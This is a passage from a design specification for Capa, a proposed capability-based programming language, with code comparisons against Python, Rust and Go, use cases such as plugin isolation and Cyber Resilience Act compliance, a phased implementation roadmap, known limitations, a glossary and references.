This section presents side-by-side examples showing how the same problem is handled in Capa and in three representative comparison languages: Python (mainstream dynamic), Rust (mainstream advanced static), and Go (mainstream pragmatic). The objective is to make concrete the philosophical differences discussed in earlier sections.

### 9.1 Example: read a JSON file and make an HTTP request

#### 9.1.1 Python version

```python
import json
import requests

def process(path: str, url: str) -> dict:
    with open(path) as f:
        data = json.load(f)
    response = requests.post(url, json=data)
    return response.json()

if __name__ == "__main__":
    result = process("data.json", "https://api.example.com")
    print(result)
```

The `process` function is as ergonomic as possible. There is no noise, no ceremony. The price is invisible: nothing in the signature indicates that this function opens files and makes HTTP requests. A malicious change in an imported library (for example, `requests`) can alter this behaviour without altering the interface.

#### 9.1.2 Rust version

```rust
use std::fs;
use serde_json::Value;

fn process(path: &str, url: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let content = fs::read_to_string(path)?;
    let data: Value = serde_json::from_str(&content)?;
    let client = reqwest::blocking::Client::new();
    let resp = client.post(url).json(&data).send()?;
    Ok(resp.json()?)
}
```

The Rust version is safer in terms of errors (mandatory `Result`) and memory, but it still allows ambient IO: the call to `std::fs::read_to_string` and the construction of a `reqwest::Client` can happen in any function, with no hint in the type. Rust improves a great deal over Python on some dimensions; it does not change the authority paradigm.

#### 9.1.3 Capa version

```capa
import json

fun process(net: Net, fs: Fs, path: String, url: String) -> Result<Json, AppError>
    let content = fs.read(path)?
    let data = json.parse(content)?
    let response = net.post(url, data)?
    return Ok(response.json()?)

fun main(net: Net, fs: Fs)
    let result = process(net, fs, "data.json", "https://api.example.com")
    match result
        Ok(json) -> print(json)
        Err(e) -> print("Error: " + e.description())
```

The Capa version is more verbose than the Python one (two extra capabilities in the parameters) and comparable to Rust in weight. The qualitative difference is in the signature: by reading only `process(net: Net, fs: Fs, ...)`, we know immediately that this function can access the network and the filesystem, and nothing else. It cannot launch processes, it cannot read environment variables, it cannot touch the system clock. This is the property that none of the previous languages offer.

### 9.2 Example: the pure transformation function

#### 9.2.1 In Python

```python
def normalize(values: list[float]) -> list[float]:
    minimum = min(values)
    maximum = max(values)
    interval = maximum - minimum
    return [(v - minimum) / interval for v in values]
```

This function looks pure. But, in Python, any future change can introduce IO without altering the signature. Purity is a convention, not a guarantee.

#### 9.2.2 In Capa

```capa
fun normalize(values: List<Float>) -> List<Float>
    let minimum = values.minimum()
    let maximum = values.maximum()
    let interval = maximum - minimum
    return values.map((v) -> (v - minimum) / interval)
```

The signature does not mention capabilities. This function is, and will continue to be, guaranteed pure. No internal change can introduce IO without altering the signature, a change that would be visible at all call sites and in any code review.

### 9.3 Qualitative synthesis

The three comparisons reveal the same pattern: Capa pays a modest verbosity cost in effectful functions, and offers in exchange a guarantee that the other languages cannot give. In pure code, Capa is as light as Python; in effectful code, it is more explicit than Rust but gives structural guarantees that Rust does not give.

> **WHEN CAPA IS THE RIGHT CHOICE**
>
> Capa is particularly well-suited for projects where auditability of behaviour matters: regulated software, systems that process sensitive data, platforms that execute plugins or third-party code, and any project subject to the EU Cyber Resilience Act.

---

## 10. Use Cases

This section presents four scenarios in which Capa offers differentiated value compared with the existing alternatives. The presentation is deliberately concrete to make visible how the capability system translates into practical benefit.

### 10.1 Case 1: Systems that execute third-party plugins

Consider a SaaS product that allows customers to write plugins that extend the platform's behaviour. The main risk is clear: a malicious or compromised plugin may access resources it should not. The traditional solutions are complex, sandboxes in separate processes, containers, virtual machines, and introduce latency and operational cost.

In Capa, a plugin is simply a function that explicitly receives the capabilities the product deems appropriate to grant. If the plugin needs to make HTTP requests to a set of domains and nothing else, it receives a `Net` capability attenuated to those domains. The isolation is structural, not operational.

### 10.2 Case 2: Compliance with the EU Cyber Resilience Act

The CRA requires manufacturers of products with digital elements to maintain an up-to-date SBOM and to handle actively exploited vulnerabilities in any component. One of the practical difficulties in meeting this obligation is the behavioural opacity of components: even knowing the SBOM, it is hard to determine which components have access to what.

In Capa, this determination is trivial. The signatures of each component's public functions explicitly declare the capabilities they receive. An automated report can, from source code, exhaustively list which components can access the network, the disk, or other sensitive resources. This evidence is directly usable in compliance documentation.

### 10.3 Case 3: DevOps and automation tooling

DevOps scripts are frequently written in Bash, Python or Go, and frequently run with elevated privileges in sensitive environments (CI/CD pipelines, production systems). The combination of elevated privilege with ambient authority is particularly dangerous: a buggy or compromised script can cause significant damage.

Capa offers, in this context, two benefits. First, it forces the programmer to make explicit which resources each script needs, reducing the risk of accidental privilege. Second, it allows the operator (not the programmer) to configure attenuated capabilities at execution time, restricting what each script can do even if its author did not request the restriction.

### 10.4 Case 4: Enterprise applications with auditing requirements

Regulated sectors (finance, healthcare, defence) have auditing requirements that mandate demonstrating control over data flow and resource access. Implementing this control in code written in languages with ambient authority requires layering of mechanisms: external static analysis, runtime monitoring, sandboxes.

In Capa, this control is a property of the language itself. The capability system is, simultaneously, the programming mechanism and the auditing mechanism. The information an auditor seeks, which parts of the code can do what, lives in the signatures of functions, and is verifiable by the compiler.

---

## 11. Implementation Roadmap

This section details the five-phase roadmap to take Capa from its current state (specification) to a language usable in production. Duration estimates assume part-time work and should be interpreted as orders of magnitude, not commitments.

### 11.1 Phase 0, Specification (concluded with this document)

This phase produces the informal specification of the language (the present document), the initial set of canonical examples, and the definition of the EBNF grammar. Duration: two to three months.

Exit criteria: reviewed technical document, complete EBNF grammar, at least 30 example programs covering all the constructs of the language.

### 11.2 Phase 1, Frontend and basic transpilation

This phase implements the lexer, the parser, the type checker (without capabilities yet), and a basic transpiler to Python. At the end of this phase, simple Capa programs (without side effects) compile and run. Estimated duration: three to four months.

Exit criteria: 100% of the pure examples from Phase 0 compile and produce the expected result in Python.

### 11.3 Phase 2, Capability system

This phase introduces the capability system proper: the standard capabilities, propagation rules, static checking, and the minimum runtime needed to support dynamic attenuation. Estimated duration: four to six months.

Exit criteria: 100% of the effectful examples from Phase 0 compile and run with the expected guarantees. A suite of violation tests demonstrates that malformed code is rejected by the compiler.

### 11.4 Phase 3, Libraries, tooling and ergonomics

This phase develops the standard library, the formatter, the documentation generator, the language server, and the integration with VS Code (and at least one other editor). Estimated duration: six to twelve months.

Exit criteria: a programming experience comparable to that of Python+pylance or Rust+rust-analyzer in IDE ergonomics.

### 11.5 Phase 4, Native backend (LLVM)

This phase introduces the native code generation backend via LLVM, retaining the Python backend as a portability alternative. Estimated duration: twelve to twenty-four months.

Exit criteria: Capa programs compiled natively achieve performance comparable to Go in benchmarks typical of the target audience.

### 11.6 Phase 5, Self-hosting and maturation

Rewriting of the compiler in the Capa language itself. This phase signals that the language is sufficiently mature to sustain itself. Estimated duration: twelve to eighteen months.

---

## 12. Known Limitations and Future Work

This chapter honestly states the limitations of Capa's current design, and identifies areas of future work that have been deliberately left out of the scope of the initial version.

### 12.1 Limitations of the capability model

Capa's capability system does not capture every dimension of security that may be relevant. It does not explicitly model confidentiality vs. integrity (a `Net` capability grants both rights without distinction). It does not support, in the initial version, capabilities that can be revoked at runtime. It has no built-in mechanism for temporal auditing of capability use.

These limitations are deliberate: the initial version prioritises conceptual simplicity over completeness. The extensions can be added later without breaking the base.

### 12.2 The boundary with Python as a risk vector

As discussed in 4.5, interoperability with Python introduces a boundary where Capa's guarantees do not apply. This boundary is made explicit (the `Unsafe` capability), but it remains a real risk vector: a plugin that receives `Unsafe` can, through Python, do anything the equivalent Python version could do.

The long-term mitigation is the maturation of the native Capa ecosystem, libraries that offer functionality equivalent to Python's without the need to cross the boundary. This mitigation requires time and adoption, and the document acknowledges that for years Python interoperability will be simultaneously a strength (ecosystem access) and a weakness (risk vector).

### 12.3 Concurrency and parallelism

Capa adopts async/await as its concurrency model. This choice is familiar but has known drawbacks (function colouring, complexity of mixed sync/async models). Alternative models (actor model, structured concurrency, fibers) were considered but not adopted in the initial version for reasons of implementation pragmatism.

Future work may introduce structured concurrency as a first-class construct, keeping async/await available for interoperability.

### 12.4 Adoption and ecosystem

Capa's most serious limitation is not technical, it is socioeconomic. New languages fail, overwhelmingly, due to lack of adoption. Capa starts with several disadvantages on this front: it is developed outside a large corporation, it has no community yet, it has no ecosystem of its own, and it proposes a model (capabilities) that requires re-education of programmers.

The adoption strategy identifies three levers. First, radical interoperability with Python allows Capa code to coexist with existing investment in Python. Second, alignment with European regulation (CRA) creates a scenario in which organisations with compliance obligations may have a concrete incentive to adopt Capa. Third, the educational community (universities, technical training) is a natural diffusion vector for a language whose value proposition includes teaching correct security concepts from the outset.

---

## Glossary

**Ambient authority**, Property of systems in which code has implicit access to resources without need for declaration or proof. The opposite of capability-based security.

**AST**, Abstract Syntax Tree. Intermediate representation produced by the parser, in which the syntactic structure of the program is represented as a tree.

**Capability**, Unforgeable reference that confers the right to invoke a privileged operation. In Capa, capabilities are opaque system types.

**Capability attenuation**, Operation that produces a new capability with reduced authority relative to the original. Unidirectional and compositional.

**CRA**, Cyber Resilience Act. European regulation (Regulamento (UE) 2024/2847) that establishes obligations for manufacturers of products with digital elements regarding SBOM, vulnerability management and demonstration of compliance.

**Effect system**, Extension of a type system that makes the side effects a function can produce visible in its type.

**Hindley-Milner**, Type inference algorithm used in ML, Haskell, OCaml and variants. Capa uses an adaptation of it.

**IR**, Intermediate Representation. In compilers, an intermediate form between source code and target code.

**LLVM**, Low Level Virtual Machine. Compilation infrastructure used as a backend by languages such as Rust, Swift, Julia and many others.

**Purity**, Property of a function that produces no observable side effects. In Capa, purity is automatically inferred from the signature.

**Refinement type**, Type annotated with a compile-time predicate. Not in Capa's core, but a planned extension.

**SBOM**, Software Bill of Materials. Formal inventory of the software components (including transitive dependencies) that constitute a product.

**Self-hosting**, The ability of a language to be used to implement its own compiler. A maturity milestone.

**Trait**, A set of operations that a type can implement. Analogous to an interface (Java, C#) or type class (Haskell).

**Transpilation**, Translation of source code in one language into source code in another language. The initial version of Capa transpiles to Python.

---

## References

The following references document prior work on capability-based security, type systems for effects, and the evolution of languages with priorities comparable to Capa's. The list is not exhaustive and will be expanded in later versions of this document.

[1] Dennis, J. B. and Van Horn, E. C. (1966). Programming semantics for multiprogrammed computations. Communications of the ACM, 9(3), 143-155.

[2] Miller, M. S. (2006). Robust Composition: Towards a Unified Approach to Access Control and Concurrency Control. PhD thesis, Johns Hopkins University.

[3] Shapiro, J. S. (1999). EROS: A Capability System. PhD thesis, University of Pennsylvania.

[4] Bracha, G. (2017). The Newspeak Programming Platform. Specification.

[5] Clebsch, S., Drossopoulou, S., Blessing, S. and McNeil, A. (2015). Deny capabilities for safe, fast actors. In AGERE!@SPLASH.

[6] Leijen, D. (2014). Koka: Programming with Row Polymorphic Effect Types. In Mathematical Structures of Computation.

[7] Brachthäuser, J. I., Schuster, P. and Ostermann, K. (2020). Effects as capabilities: Effect handlers and lightweight effect polymorphism. PACMPL, 4(OOPSLA).

[8] Pierce, B. C. (2002). Types and Programming Languages. MIT Press.

[9] European Union. Regulamento (UE) 2024/2847 of the European Parliament and of the Council on horizontal cybersecurity requirements for products with digital elements (Cyber Resilience Act).

[10] ENISA (2023). Good Practices for Supply Chain Cybersecurity.

[11] Ohm, M., Plate, H., Sykosch, A. and Meier, M. (2020). Backstabber's knife collection: A review of open source software supply chain attacks. In DIMVA.

[12] Rust Project. The Rust Programming Language Reference.

[13] Microsoft. TypeScript Language Specification.
